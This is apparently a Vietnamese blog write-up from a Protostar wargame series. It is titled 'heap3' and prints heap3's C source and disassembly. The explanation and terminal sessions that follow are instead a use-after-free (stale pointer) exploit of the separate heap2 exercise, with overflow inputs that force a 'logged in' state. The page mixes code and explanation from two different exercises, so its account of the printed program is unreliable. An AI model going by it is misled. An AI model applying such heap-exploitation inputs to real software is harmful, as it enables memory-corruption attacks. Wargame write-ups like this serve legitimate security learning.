---
layout: post
title: heap3
---

Trong bài này, chúng ta sẽ tìm hiểu sâu hơn về một phiên bản malloc do Doug Lea đưa ra, qua đó exploit chương trình dựa trên những hiểu biết này.
Sau đây là source code và asm code của chương trình heap3.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```
```asm
0x08048864 <winner+0>:  push   ebp
0x08048865 <winner+1>:  mov    ebp,esp
0x08048867 <winner+3>:  sub    esp,0x18
0x0804886a <winner+6>:  mov    DWORD PTR [esp],0x0
0x08048871 <winner+13>: call   0x8048780 <time@plt>
0x08048876 <winner+18>: mov    edx,0x804ac00
0x0804887b <winner+23>: mov    DWORD PTR [esp+0x4],eax
0x0804887f <winner+27>: mov    DWORD PTR [esp],edx
0x08048882 <winner+30>: call   0x8048760 <printf@plt>
0x08048887 <winner+35>: leave
0x08048888 <winner+36>: ret
0x08048889 <main+0>:    push   ebp
0x0804888a <main+1>:    mov    ebp,esp
0x0804888c <main+3>:    and    esp,0xfffffff0
0x0804888f <main+6>:    sub    esp,0x20
0x08048892 <main+9>:    mov    DWORD PTR [esp],0x20
0x08048899 <main+16>:   call   0x8048ff2 <malloc>
0x0804889e <main+21>:   mov    DWORD PTR [esp+0x14],eax
0x080488a2 <main+25>:   mov    DWORD PTR [esp],0x20
0x080488a9 <main+32>:   call   0x8048ff2 <malloc>
0x080488ae <main+37>:   mov    DWORD PTR [esp+0x18],eax
0x080488b2 <main+41>:   mov    DWORD PTR [esp],0x20
0x080488b9 <main+48>:   call   0x8048ff2 <malloc>
0x080488be <main+53>:   mov    DWORD PTR [esp+0x1c],eax
0x080488c2 <main+57>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 <main+60>:   add    eax,0x4
0x080488c8 <main+63>:   mov    eax,DWORD PTR [eax]
0x080488ca <main+65>:   mov    DWORD PTR [esp+0x4],eax
0x080488ce <main+69>:   mov    eax,DWORD PTR [esp+0x14]
0x080488d2 <main+73>:   mov    DWORD PTR [esp],eax
0x080488d5 <main+76>:   call   0x8048750 <strcpy@plt>
0x080488da <main+81>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488dd <main+84>:   add    eax,0x8
0x080488e0 <main+87>:   mov    eax,DWORD PTR [eax]
0x080488e2 <main+89>:   mov    DWORD PTR [esp+0x4],eax
0x080488e6 <main+93>:   mov    eax,DWORD PTR [esp+0x18]
0x080488ea <main+97>:   mov    DWORD PTR [esp],eax
0x080488ed <main+100>:  call   0x8048750 <strcpy@plt>
0x080488f2 <main+105>:  mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 <main+108>:  add    eax,0xc
0x080488f8 <main+111>:  mov    eax,DWORD PTR [eax]
0x080488fa <main+113>:  mov    DWORD PTR [esp+0x4],eax
0x080488fe <main+117>:  mov    eax,DWORD PTR [esp+0x1c]
0x08048902 <main+121>:  mov    DWORD PTR [esp],eax
0x08048905 <main+124>:  call   0x8048750 <strcpy@plt>
0x0804890a <main+129>:  mov    eax,DWORD PTR [esp+0x1c]
0x0804890e <main+133>:  mov    DWORD PTR [esp],eax
0x08048911 <main+136>:  call   0x8049824 <free>
0x08048916 <main+141>:  mov    eax,DWORD PTR [esp+0x18]
0x0804891a <main+145>:  mov    DWORD PTR [esp],eax
0x0804891d <main+148>:  call   0x8049824 <free>
0x08048922 <main+153>:  mov    eax,DWORD PTR [esp+0x14]
0x08048926 <main+157>:  mov    DWORD PTR [esp],eax
0x08048929 <main+160>:  call   0x8049824 <free>
0x0804892e <main+165>:  mov    DWORD PTR [esp],0x804ac27
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
0x0804893a <main+177>:  leave
0x0804893b <main+178>:  ret
```

Mục tiêu là thay đổi giá trị `auth` trong một biến có type là struct `auth`.
Chương trình heap2 sẽ làm những việc sau đây.

1. Chạy một vòng loop vô hạn
2. Mỗi lượt, chương trình sẽ đọc lệnh do người dùng nhập vào stdin. Ta có cách lệnh:
* auth <string>
* reset
* service <stirng>
* login
3. Khi một lệnh được nhập vào, chương trình sẽ thực hiện một chuỗi lệnh khác nhau.

Tuy nhiên cũng cần lưu ý trước là chương trình có khá nhiều bug sau khi đọc asm code so với source code.
Vì vậy, trước hết, chúng ta sẽ giả định chương trình hoạt động theo đúng "mong muốn" ban đầu và chúng ta sẽ exploit chương trình theo hướng stale pointer.
Các bug sẽ được đề cập sau.

Đối với gợi ý exploit sử dụng stale pointer, ta để ý rằng biến pointer `auth` được `free` khi nhận lệnh reset.
Tuy nhiên sau khi `free`, biến này vẫn có khả năng được sử dụng nếu người dùng nhập lệnh login.
Để exploit stale pointer, chúng ta sẽ giả thiết rằng sau khi free, chúng ta vẫn có thể gán lại địa chỉ này cho một biến khác và có thể ghi vào đó.
Theo đó, ta sẽ chọn flow cho chương trình như sau.

1. Khởi tạo địa chỉ cho `auth` qua `malloc`. Việc này được thực hiện qua lệnh auth
2. Free địa chỉ này, chỉ để trả quyền sử dụng cho một biến khác. Việc này được thực hiện qua lệnh reset
3. Xin cấp lại một địa chỉ trên heap với mục tiêu lấy lại quyền ghi vào vùng chứa biến int `auth` thuộc struct `auth`. Việc này được thực hiện qua lệnh service. Chúng ta sẽ hy vọng rằng biến mới có địa chỉ nhỏ hơn địa chỉ đến int `auth` trong struct.
4. Sau khi cấp địa chỉ, ghi một giá trị vào đó để cố gắng làm tràn đến int `auth`.
5. Dùng lệnh login để kiểm tra mục tiêu.

Với flow này, ta kiểm tra chương trình, <span style="color:springgreen">thông tin</span> và <span style="color:aqua">nhập vào</span>, theo từng bước như sau.

<pre class="memory">
<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
<span style="color:aqua">auth abcd</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">service 1</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
</pre>

Ở đoạn ví dụ trên, chúng ta không free `auth` mà tiếp tục xin cấp bộ nhớ trên heap.
Địa chỉ của `auth` và `service` là `0x804c008` và `0x804c018`, khác nhau.
Nếu có `free` trước khi xin cấp bộ nhớ cho biến `service`, ta có kết quả như sau.

<pre class="memory">
<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
<span style="color:aqua">auth abcd</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">reset</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">service 1</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c008 ]</span>
</pre>

Lúc này, `service` đã lấy lại giá trị cũ của `auth`.
Hai biến này về cơ bản là có cùng địa chỉ.
Như vậy thay vì chạy lệnh service 1, ta sẽ vẫn dùng lệnh này nhưng với giá trị nhập vào đủ lớn để ghi được qua vị trí của int `auth` trong `auth`.
Với struct `auth` và pointer `auth`, ta sẽ phân bố vùng nhớ gồm 32 byte đầu cho `auth->name` và 4 byte sau cho `auth->auth`.
Như vậy, ta sẽ dùng chuỗi dài ít nhất 33 byte với byte cuối khác `\0` cho lệnh service.
Như sau là một cách.

<pre class="memory">
<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
<span style="color:aqua">auth abcd</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">reset</span>
<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
<span style="color:aqua">service 11112222333344441</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
<span style="color:aqua">login</span>
<span style="color:springgreen">you have logged in already!</span>
<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
</pre>

Mục tiêu đã hoàn thành!

Tuy nhiên!

Tuy nhiên, chúng ta thấy chương trình báo rằng `service` thực sự nằm ở `0x804c018` thay vì trùng với `auth` tại `0x804c008`.
Việc này cùng một số quan sát khác và bug của chương trình, mình sẽ liệt ra như sau.

* Tác giả sử dụng quá nhiều thứ với tên `auth`. Khi đọc bài viết, hẳn các bạn cũng sẽ bị rố. Trong chương trình có struct tên `auth`, trong struct có biến int tên `auth`, và ngoài struct là biến global pointer trên `auth`. Không rõ có phải hay không nhưng do cách đặt tên này làm cả tác giả bị lẫn. Khi xin cấp bộ nhớ cho pointer `auth`, tác giả dùng `sizeof` với struct nhưng thật sự chương trình đã compile thành `sizeof` với biến pointer. Và đúng ra sẽ xin cấp 36 byte bộ nhớ nhưng lại thành cấp 4 byte. Việc này được thể hiện cả trong asm code của chương trình.
* Một số lệnh được viết khá cẩu thả. Ví dụ như lệnh service. Đúng ra tác giá sẽ muốn dùng `strncmp` với độ dài là 7 ký tự, nhưng chương trình viết thành 6. Do đó, nếu bạn chạy lệnh servic thì điều kiện lệnh vẫn thỏa mãn. Hoặc nếu dùng lệnh service thì ký tự dấu cách sau service cũng được tính để ghi thành chuỗi thay vì làm thành phần lệnh.
* Với ví dụ cuối cùng, mặc dù đã `free` biến `auth` nhưng khi cấp bộ nhớ, biến `service` vẫn nhận một địa chỉ mới. Mình đã thử và thấy nếu chuỗi đi với lệnh service có trên 12 byte thì `service` sẽ nhận địa chỉ mới.
* Cũng cần lưu ý rằng nếu nhập lệnh service thì ký tự cuối sẽ là `\0x0a` (line feed) và null-terminated character. Như vậy chỉ cần 10 ký tự theo sau lệnh thì tổng số ký tự sẽ là 12.

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 1111222233
[ auth = 0x804c008, service = 0x804c008 ]
```

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 11112222333
[ auth = 0x804c008, service = 0x804c018 ]
```

Phần source code này thực sự khá cẩu thả nên về cơ bản chúng ta chỉ cần nắm được lý thuyết về stale pointer sau bài này là ổn.

## Ref
```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service 11112222333344441
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 1111222233334444
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```
